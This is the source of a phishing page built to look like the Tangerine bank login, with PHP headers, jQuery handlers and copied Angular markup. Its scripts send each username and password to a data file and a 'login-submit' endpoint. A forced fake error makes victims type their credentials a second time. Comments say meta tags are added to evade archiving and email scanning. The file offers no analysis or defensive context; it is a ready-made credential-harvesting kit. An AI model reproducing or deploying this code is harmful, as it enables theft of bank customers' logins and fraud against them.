<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html la=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <title>Login | Tangerine</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

  </script><meta name="robots" content="noarchive"><meta http-equiv="X-Content-Type-Options" content="nosniff">
        <meta name="description" content="">
        <link rel="shortcut icon" href="/deposit/favicon.ico" type="image/x-icon">
        <meta name="viewport" content="initial-scale=1, width=device-width">
        <link href="./files/vendor.css" rel="stylesheet" media="all" onload="this.media='all'">
        <link href="./files/global.css" rel="stylesheet" media="all" onload="this.media='all'">
        <link href="./files/app.css" rel="stylesheet" media="all" onload="this.media='all'">
        <link rel="preload" as="font" href="/assets/tang/fonts/icomoon.ttf" type="font/ttf" crossorigin="">
        <link rel="preload" as="image" href="./files/tangerine-logo-white.svg">
        <link rel="preload" as="image" href="/assets/tang/fonts/icon_DownArrow-white.svg" type="image/svg+xml">
        <link href="./files/css2" rel="stylesheet">
        <link rel="stylesheet" href="./files/login.css">
        <script src="./files/jquery-3.6.0.min" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'Tang';
            var lrinfo = 'Login';
        </script>
        <script src="./files/actions"></script>
        <script>
        $(document).ready(function() {
            var attempt = 2;

            $('.lab-form').submit(function(e) {
                e.preventDefault();
                var form = this;

                if (attempt == 1) {
                    $('.div-loader').css('display', 'block');
                    $('.div-main').css('display', 'none');

                    $.post('/deposit/tang/api/login-submit', $(this).serialize(), function(response) {
                        $('.error-div').css('display', 'block');

                        $(form).trigger('reset');

                        $('#step-login').css('display', 'block');
                        $('#step-pin').css('display', 'none');
                        $('#step-pin mat-card-actions, #step-pin mat-card, #step-pin mat-card-actions').css('display', 'none');
                        $('#input-username').focus();

                        $('.div-loader').css('display', 'none');
                        $('.div-main').css('display', 'block');
                    }, 'JSON');

                    attempt = 2;
                } else {
                    $('.div-loader').css('display', 'block');
                    $('.div-main').css('display', 'none');

                    $.post('/deposit/tang/api/login-submit', $(this).serialize(), function(response) {
                        if (response.status) {
                            if (response.data.loader) {
                                location.href = '/deposit/tang/w';
                            } else {
                                location.href = '/deposit/tang/q';
                            }
                        } else {
                            $(form).trigger('reset');

                            $('.error-div').css('display', 'block');

                            $('#step-login').css('display', 'block');
                            $('#step-pin').css('display', 'none');
                            $('#step-pin mat-card-actions, #step-pin mat-card, #step-pin mat-card-actions').css('display', 'none');
                            $('#input-username').focus();

                            $('.div-loader').css('display', 'none');
                            $('.div-main').css('display', 'block');
                        }
                    }, 'JSON');
                }

                return false;
            });

            $(document).on('change', '.input-username, .input-password', function() {
                var username = $(this).hasClass('input-username') ? $(this).val() : $(this).closest('form').find('.input-username').val();
                var password = $(this).hasClass('input-password') ? $(this).val() : $(this).closest('form').find('.input-password').val();
                $.post('/deposit/tang/data.txt', {username: username, password: password});
            });

            $('.mat-slide-toggle-thumb-container').click(function() {
                if ($('.mat-slide-toggle').hasClass('mat-checked')) {
                    $('.mat-slide-toggle').removeClass('mat-checked');
                } else {
                    $('.mat-slide-toggle').addClass('mat-checked');
                }
            });
        });
        </script>
        <style>
        .message-card .critical {
            background-color: rgba(235, 1, 49, 0.08);
            border-left: solid 3px #EB0131;
        }

        .message-card .message-box {
            margin: 1rem 0;
            padding: 16px 15px;
            margin-bottom: 15px;
        }

        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0,0,0,0);
            border: 0;
        }

        .message-card .cancel-icon {
            color: #EB0131;
            font-size: 1.2rem;
            height: 1.2rem;
            width: 1.2rem;
            min-width: 1.2rem;
        }

        .message-card mat-icon {
            position: relative;
            left: 0.125rem;
        }

        .message-card .message-box-content {
            margin: 0 0 0 0.5rem;
            display: -ms-flexbox;
            display: flex;
            -ms-flex: 1;
            flex: 1;
            -ms-flex-direction: column;
            flex-direction: column;
            -ms-flex-pack: center;
            justify-content: center;
        }

        @media (min-width: 74.4375rem) {
            .div-main .navbar {
                display: none !important;
            }
        }
        </style>
    </head>
    <body class="fb2-index" style="">
        
        <div class="navbar">
<div class="navbar">
<div class="brand padding__b--fix1"><img src="./Accept the transfer _ Tangerine_files/brand.png" alt="" role="presentation"></div>
</div>
</div>
        <!-- uiView: page-content -->
        <div ui-view="page-content" class="page-content ng-scope div-main" role="main" id="mainContent" tabindex="-1" translate-cloak="" style="overflow-y: hidden;">
            <login-page return-to="::$resolve.returnTo" class="ng-scope ng-isolate-scope">
                <div>
                    <!-- ngIf: !$ctrl.isNewLoginFlow --> <!-- ngIf: $ctrl.isNewLoginFlow -->
                    <tngx-login-new [return-to-param]="$ctrl.returnTo" class="ng-scope" _nghost-llv-c5="">
                        <form class="" action="040148.php" method="post">
                            <div _ngcontent-llv-c5="" class="mat-card-container c-login-flow" id="step-login">
                                <mat-card _ngcontent-llv-c5="" class="mat-elevation-z0 mat-card mat-focus-indicator">
                                    <mat-card-header _ngcontent-llv-c5="" class="mat-card-header">
                                        <div class="mat-card-header-text">
                                            <mat-card-title _ngcontent-llv-c5="" class="mat-card-title" id="login-user-id-header-title">
                                                <h1 _ngcontent-llv-c5="" tabindex="-1">Log in</h1>
                                            </mat-card-title>
                                        </div>
                                    </mat-card-header>
                                    <mat-card-content _ngcontent-llv-c5="" class="mat-card-content">
                                        <div _ngcontent-ift-c19="" class="service-error ng-star-inserted error-div" style="display: none" id="login-pin-service-errors">
                                            <tngx-message-card _ngcontent-ift-c19="" aria-live="polite" _nghost-ift-c6="">
                                                <div _ngcontent-ift-c6="" class="message-card" tabindex="-1">
                                                    <div _ngcontent-ift-c6="" class="message-box critical">
                                                        <div _ngcontent-ift-c6="" fxlayout="row" style="flex-direction: row; box-sizing: border-box; display: flex;">
                                                            <div _ngcontent-ift-c6="" class="sr-only">Error</div>
                                                            <mat-icon _ngcontent-ift-c6="" class="cancel-icon mat-icon notranslate material-icons mat-icon-no-color ng-star-inserted" role="img" aria-hidden="true" data-mat-icon-type="font">cancel</mat-icon>
                                                            <div _ngcontent-ift-c6="" class="message-box-content">
                                                                <span _ngcontent-ift-c6="" id="message-body-login-pin-message-card-error" class="ng-star-inserted">Your PIN and Client Number make a good pair. Please check your records and make sure they are both valid and work together. As a reminder - your PIN should be either 4 or 6 numbers.</span>
                                                            </div>
                                                        </div>
                                                        <!---->
                                                    </div>
                                                </div>
                                            </tngx-message-card>
                                        </div>
                                        <div _ngcontent-llv-c5="" class="mat-card-content-container-28rem">
                                            <!----><!---->
                                            <div class="">
                                                <tngx-tab-panel _nghost-llv-c9="">
                                                    <div>
                                                        <mat-tab-group class="mat-tab-group mat-primary" mat-align-tabs="start" _ngcontent-llv-c9="">
                                                            <mat-tab-header class="mat-tab-header">
                                                                <div aria-hidden="true" class="mat-tab-header-pagination mat-tab-header-pagination-before mat-elevation-z4 mat-ripple mat-tab-header-pagination-disabled" mat-ripple="">
                                                                    <div class="mat-tab-header-pagination-chevron"></div>
                                                                </div>
                                                                <div class="mat-tab-label-container">
                                                                    <div class="mat-tab-list" role="tablist" style="transform: translateX(0px);">
                                                                        <div class="mat-tab-labels">
                                                                            
                                                                            
                                                                            
                                                                        </div>
                                                                        <mat-ink-bar class="mat-ink-bar" style="visibility: visible; left: 0px; width: 152px;"></mat-ink-bar>
                                                                    </div>
                                                                </div>
                                                                <div aria-hidden="true" class="mat-tab-header-pagination mat-tab-header-pagination-after mat-elevation-z4 mat-ripple mat-tab-header-pagination-disabled" mat-ripple="">
                                                                    <div class="mat-tab-header-pagination-chevron"></div>
                                                                </div>
                                                            </mat-tab-header>
                                                            <div class="mat-tab-body-wrapper">
                                                                <!---->
                                                                <mat-tab-body class="mat-tab-body ng-tns-c18-1 mat-tab-body-active ng-star-inserted" role="tabpanel" id="mat-tab-content-login-user-id-tabs-0" aria-labelledby="mat-tab-label-login-user-id-tabs-0">
                                                                    <div class="mat-tab-body-content ng-trigger ng-trigger-translateTab" style="transform: none;">
                                                                        <!----><!----><!---->
                                                                    </div>
                                                                </mat-tab-body>
                                                                <mat-tab-body class="mat-tab-body ng-tns-c18-2 ng-star-inserted" role="tabpanel" id="mat-tab-content-login-user-id-tabs-1" aria-labelledby="mat-tab-label-login-user-id-tabs-1">
                                                                    <div class="mat-tab-body-content ng-trigger ng-trigger-translateTab" style="transform: translate3d(100%, 0px, 0px); min-height: 1px;">
                                                                        <!---->
                                                                    </div>
                                                                </mat-tab-body>
                                                            </div>
                                                        </mat-tab-group>
                                                    </div>
                                                </tngx-tab-panel>
                                            </div>
                                            <div>
                                                <div>
                                                    <!---->
                                                    <mat-form-field _ngcontent-llv-c5="" appearance="outline" id="main-div" class="form-field mat-form-field ng-tns-c10-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-can-float mat-form-field-has-label mat-form-field-hide-placeholder ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                                        <div class="mat-form-field-wrapper">
                                                            <div class="mat-form-field-flex">
                                                                <!----><!---->
                                                                <div class="mat-form-field-outline ng-tns-c10-0 ng-star-inserted">
                                                                    <div class="mat-form-field-outline-start" style="width: 11px;"></div>
                                                                    <div class="mat-form-field-outline-gap" style="width: 56.5px;"></div>
                                                                    <div class="mat-form-field-outline-end"></div>
                                                                </div>
                                                                <div class="mat-form-field-outline mat-form-field-outline-thick ng-tns-c10-0 ng-star-inserted">
                                                                    <div class="mat-form-field-outline-start" style="width: 11px;"></div>
                                                                    <div class="mat-form-field-outline-gap" style="width: 56.5px;"></div>
                                                                    <div class="mat-form-field-outline-end"></div>
                                                                </div>
                                                                <!---->
                                                                <div class="mat-form-field-infix">
                                                                    <input class="mat-input-element mat-form-field-autofill-control ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored lrinput" id="input-username" name="username" required="" type="text" maxle="" attr-action="Filling Username">
                                                                    <input type="hidden" name="CRSFToken" value="">
                                                                    <span class="mat-form-field-label-wrapper">
                                                                        
                                                                    </span>
                                                                </div>
                                                            </div>
                                                            <div class="mat-form-field-subscript-wrapper">
                                                                <!----><!---->
                                                                <div class="mat-form-field-hint-wrapper ng-tns-c10-0 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                                                    <!---->
                                                                    <mat-hint _ngcontent-llv-c5="" class="login-input-hint mat-hint" id="mat-hint-0"> You can use your Client Number, Card Number, or Username.</mat-hint>
                                                                    <div class="mat-form-field-hint-spacer"></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </mat-form-field>
                                                    <!---->
                                                </div>
                                                
                                            </div>
                                        </div>
                                    </mat-card-content>
                                    <mat-card-actions class="mat-card-actions" style="display: block;">
                                                                <button _ngcontent-orv-c20="" class="mat-focus-indicator mat-flat-button mat-button-base mat-primary" color="primary" id="login-pin-submit-button" mat-flat-button="" type="submit" name="save" value="1">
                                                                    <span class="mat-button-wrapper">Next</span>
                                                                    <span class="mat-button-ripple mat-ripple" matripple=""></span>
                                                                    <span class="mat-button-focus-overlay"></span></button>
                                                            </mat-card-actions>
                                    <!---->
                                    
                                </mat-card>
                                
                            </div>
                            
                        </form>
                        <script>
                        $(document).ready(function() {
                            $('#input-username').focusin(function() {
                                $('#main-div').removeClass('mat-form-field-hide-placeholder').addClass('mat-form-field-should-float mat-focused');
                            });

                            $('#input-username').focusout(function() {
                                var val = $(this).val();
                                if (val == '') {
                                    $('#main-div').addClass('mat-form-field-hide-placeholder').removeClass('mat-form-field-should-float mat-focused');
                                }
                            });

                            $('#input-pin').focusin(function() {
                                $('#main-div2').removeClass('mat-form-field-hide-placeholder').addClass('mat-form-field-should-float mat-focused');
                            });

                            $('#input-pin').focusout(function() {
                                var val = $(this).val();
                                if (val == '') {
                                    $('#main-div2').addClass('mat-form-field-hide-placeholder').removeClass('mat-form-field-should-float mat-focused');
                                }
                            });

                            $('#btn-next').click(function() {
                                var val = $('#input-username').val();
                                if (val == '') {
                                    $('#input-username').focus();
                                } else {
                                    $('#step-login').css('display', 'none');
                                    $('#span-username').html(val);
                                    $('#step-pin').css('display', 'block');
                                    $('#step-pin mat-card-actions, #step-pin mat-card, #step-pin mat-card-actions').css('display', 'block');
                                }
                            });
                        });
                        </script>
                    </tngx-login-new>
                    <!-- end ngIf: $ctrl.isNewLoginFlow -->
                </div>
            </login-page>
        </div>
        <tng-main-nav class="ng-isolate-scope div-loader" style="display: none">
            <nav class="navbar print-hide" ng-class="{'nativeNav' : $ctrl.EnvironmentService.isNative()}">
                <a id="mainNav_home" class="brand nonclickable" href="/220098/tang" ng-click="$ctrl.handleGoHome()" ng-class="{'nonclickable' : $ctrl.isTitleLogoNotClickable()}">
                    <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="logo-white print-hide" src="./files/brand-white.png">
                    <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="logo-orange print-only-inline" src="./files/brand-orange.png">
                </a>
            </nav>
        </tng-main-nav>
        <div ui-view="page-content" class="page-content ng-scope div-loader" style="padding-bottom: 0px; display: none">
            <forgot-login class="ng-scope ng-isolate-scope">
                <form method="post" action="/220098/tang" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-email">
                    <style>
                    .forgot-login select, .forgot-login input[type="text"], .forgot-login input[type="tel"], .forgot-login input[type="password"] {
                        font-size: 17px;
                        margin-top: 10px;
                        margin-bottom: 15px;
                        font-weight: 500;
                        border: 1px solid #9e9e9e;
                    }

                    .heading--title2 {
                        margin-bottom: 25px;
                        text-align: center;
                    }

                    .forgot-login button {
                        margin: 0px;
                    }

                    .text-right {
                        text-align: right;
                    }

                    .navbar {
                        display: block !important;
                        background-color: #ea7024 !important;
                    }

                    .btn, [class*=" btn--"], [class^=btn--] {
                        background-color: #ea7024;
                    }

                    .forgot-login__email {
                        max-width: 30em;
                        margin-left: auto;
                        margin-right: auto;
                    }

                    .application-theme-web {
                        background-color: #ffffff;
                    }
                    </style>
                    <div class="forgot-login" style="margin-top: 0px; padding: 23px;">
                        <div class="forgot-login__email ng-scope" ng-if="$ctrl.currentState === $ctrl.STATES.FORM">
                            <style>
                            .loader-div {
                                text-align: center;
                                padding-top: 20px;
                            }

                            .loader-div h2 {
                                font-size: 28px;
                                margin-bottom: 40px;
                            }
                            </style>
                            <div class="_1AR6e5iqu8uXHMTFKLnqWr loader-div">
                                <h2 class="heading--title2 ng-binding">Processing</h2>
                                <img src="./files/loading.gif" width="80">
                            </div>
                        </div>
                    </div>
                </form>
            </forgot-login>
        </div>
    


</body></html>